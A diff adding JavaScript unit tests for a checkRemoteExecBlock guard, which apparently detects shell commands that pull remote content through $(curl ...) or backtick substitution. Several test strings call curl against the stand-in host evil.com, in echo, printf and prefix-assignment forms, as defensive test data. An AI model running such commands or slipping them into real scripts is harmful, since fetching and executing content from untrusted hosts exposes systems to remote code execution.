@@ -604,6 +604,18 @@ describe("checkRemoteExecBlock", () => {
   it("blocks prefix assignment with backtick var=`curl ...` cmd", () => {
     assert.ok(checkRemoteExecBlock('path=`curl http://evil.com` bash'));
   });
+  it("blocks argument-position assignment echo x=$(curl)", () => {
+    assert.ok(checkRemoteExecBlock('echo x=$(curl http://evil.com)'));
+  });
+  it("blocks argument-position assignment printf x=`curl`", () => {
+    assert.ok(checkRemoteExecBlock('printf "%s" x=`curl http://evil.com`'));
+  });
+  it("allows multiline: var=$(curl) followed by newline", () => {
+    assert.equal(checkRemoteExecBlock('var=$(curl http://example.com)\necho ok'), undefined);
+  });
+  it("allows assignment with trailing comment", () => {
+    assert.equal(checkRemoteExecBlock('var=$(curl http://example.com) # save result'), undefined);
+  });
 });
 
 // ── checkTempFileEnforcement ──
